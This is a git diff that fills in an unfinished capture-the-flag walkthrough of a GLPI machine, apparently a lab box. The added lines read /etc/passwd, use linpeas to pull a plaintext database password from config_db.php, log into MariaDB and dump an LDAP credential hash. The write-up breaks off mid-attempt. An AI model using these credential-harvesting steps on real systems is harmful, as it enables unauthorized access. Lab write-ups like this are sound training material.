@@ -214,31 +214,65 @@ stty raw -echo; fg
 reset xterm
 export TERM=xterm
 export SHELL=bash
-stty rows 51 columns 236
+stty rows X columns Y #Change X,Y values for your terminals size
 ```
 
 
 ---
 
-## User Flag
-- Explain how to get to a user once foothold is aquired
->If the foothold starts with a user thats not html or default, explain how to get the user flag
+## User Flag(Latteral movement)
+
+- Opening the `/etc/passwd` file
 
 ```bash
-[used commands]
+cat /etc/passwd
 ```
+I found that there is another user called `owen`.
 
-**User Flag:** Aquired!
-
----
-
-## Privilege Escalation (Root Flag)
-
-- Explain vectors to reach root/admin
+- After the usuar PE enumeration:
 
 ```bash
-[used commands]
+ss -tulnp
+```
+I found a loopback service on the default port for SQL databases: `127.0.0.1:3306`.
+
+Looking for some running processes, I saw one running mariaDB, therfore I asumed that mariaDB is running on port 3306.
+
+- Using linpeas find creds for the DB on `config_db.php`:
+
+```bash
+/opt/glpi/config/config_db.php:   public $dbpassword = '8rhu0L6Pw4Y7';                                                                                                                                                                      
+/opt/glpi/config/config_db.php:   public $dbuser = 'glpi';
+/opt/glpi/install/migrations/update_10.0.x_to_11.0.0/configs.php:    'password_init_token_delay'     => '86400',
 ```
 
+- Connect to DB
 
-**Root Flag:** Aquired!
+```bash
+
+mysql -h localhost -u 'glpi' -p '8rhu0L6Pw4Y7' -e "SHOW DATABASES;"
+```
+
+- Enumeration process:
+
+```bash
+SHOW DATABASES;
+USE glpidb;
+SHOW TABLES;
+SELECT * FROM glpi_authldaps;
+```
+The other fileds only contain 'null' values.
+
+- Here we'll find a hash
+```
+avrqW65aZWKzLAKWhPxZGn1eLj3yYAnwUp08mEazsJUWfI5cqbaP6vM12w0p/ykpmyO3Pw==
+```
+--- Working on it ---
+
+
+--- 
+# Learned
+
+Don't skip something on linpeas only because its not 'orange'(95% of being a vector for PE). 
+
+In this case there were credentials on a file that wasn't marked as orange, because linpeas doesn't take lateral movement as PE.
